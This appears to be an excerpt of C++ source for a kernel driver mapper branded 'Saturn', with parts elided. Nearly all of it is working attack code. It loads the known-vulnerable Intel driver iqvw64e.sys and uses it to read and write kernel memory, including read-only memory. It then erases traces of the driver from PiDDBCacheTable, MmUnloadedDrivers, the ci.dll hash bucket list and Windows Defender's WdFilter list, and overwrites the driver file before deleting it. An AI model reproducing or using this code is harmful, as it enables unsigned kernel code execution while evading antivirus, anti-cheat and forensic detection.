...
HANDLE intel_driver::Load() {
	...
	if (intel_driver::IsRunning()) {
		Log(L"[Saturn] \\Device\\Nal is already in use. Restart PC and try again." << std::endl);
	...
	Log(L"[Saturn] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[Saturn] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log(L"[Saturn] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[Saturn] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}
	...
	{
		Log(L"[Saturn] Failed to load driver iqvw64e.sys" << std::endl);
	...
	if (ntoskrnlAddr == 0) {
		Log(L"[Saturn] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[Saturn] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log(L"[Saturn] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
...
bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
	...
	if (!WdFilter) {
		Log("[Saturn] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}
		...
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			...
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
					...
					Log("[Saturn] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
...
bool intel_driver::Unload(HANDLE device_handle) {
	Log(L"[Saturn] Unloading vulnerable driver" << std::endl);
	...
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		...
		Log(L"[Saturn] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	...
	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		Log(L"[Saturn] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}
	...
	if (!mapped_physical_memory) {
		Log(L"[Saturn] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	...
	Log(L"[Saturn] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}
...
bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { 
	...
	if (PiDDBLockPtr == NULL) { 
		...
		if (PiDDBLockPtr == NULL) {
			Log(L"[Saturn] Warning PiDDBLock not found" << std::endl);
			return false;
		}
		Log(L"[Saturn] PiDDBLock found with second pattern" << std::endl);
		PiDDBLockPtr += 16;
	}
	else {
		PiDDBLockPtr += 28;
	...
	if (PiDDBCacheTablePtr == NULL) {
		Log(L"[Saturn] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	Log("[Saturn] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[Saturn] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[Saturn] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[Saturn] PiDDBLock Locked" << std::endl);
	...
	if (pFoundEntry == nullptr) {
		Log(L"[Saturn] Not found in cache" << std::endl);
	...
	Log(L"[Saturn] PiDDBCacheTable Cleaned" << std::endl);
...
uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		Log(L"[Saturn] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { 
		Log(L"[Saturn] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		Log(L"[Saturn] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}
	...
	if (result <= 0) {
		Log(L"[Saturn] Can't find pattern" << std::endl);
		return 0;
	}
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	if (!ci) {
		Log(L"[Saturn] Can't Find ci.dll module address" << std::endl);
		return false;
	}
	...
	if (!sig) {
		Log(L"[Saturn] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		Log(L"[Saturn] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	...
	{
		Log(L"[Saturn] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[Saturn] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[Saturn] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[Saturn] g_HashCacheLock Locked" << std::endl);
	...
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[Saturn] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
	...
	while (entry) {
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[Saturn] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		...
		if (expected_len == wsNameLen) {
			...
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[Saturn] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[Saturn] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (find_result != std::wstring::npos) {
				Log(L"[Saturn] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[Saturn] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[Saturn] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[Saturn] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[Saturn] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[Saturn] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[Saturn] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
